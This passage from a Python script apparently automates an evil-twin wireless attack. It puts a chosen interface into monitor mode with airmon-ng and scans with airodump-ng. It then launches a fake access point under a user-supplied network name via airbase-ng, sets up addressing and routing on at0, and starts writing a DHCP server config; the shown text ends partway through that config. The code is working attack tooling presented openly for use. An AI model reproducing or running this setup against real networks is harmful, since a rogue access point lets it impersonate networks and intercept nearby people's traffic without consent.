    for i in LAN:
        Color.p(    '{R}--> {GR}'+i+'{GR}{O}\n')
    print('')
    Board = input('>> ')
    s = subprocess.getstatusoutput('sudo airmon-ng start '+Board)
    NewBoard = Board+'mon'
    print('')
    Color.p('{G}Press ^C when you are network{G}\n')
    print('')
    time.sleep(2)
    os.system('sudo airodump-ng '+Board+'mon')
    Color.p('{GR}Insert name of network{C}\n')
    REDE = input('>> ')
    CMD = ['mate-terminal']
    CMD.extend(['-x', 'bash', '-c', 'sudo airbase-ng -e '+REDE+' -c 11 -P '+NewBoard+' ; exec $SHELL'])
    subprocess.Popen(CMD, stdout=subprocess.PIPE)
    time.sleep(5)
    os.system('sudo ifconfig at0 up')
    os.system('sudo ifconfig at0 192.168.2.1/24')
    os.system('sudo route add -net 192.168.2.0 netmask 255.255.255.0 gw 192.168.2.1')
    #apt install isc-dhcp-server
    ARQ = open('dhcpd.conf', 'w')
    TXT = '''
    authoritative;
    default-lease-time 600;
    max-lease-time 7200;
    subnet 192.168.2.0 netmask 255.255.255.0 {
    option subnet-mask 255.255.255.0;
    option broadcast-address 192.168.2.255;

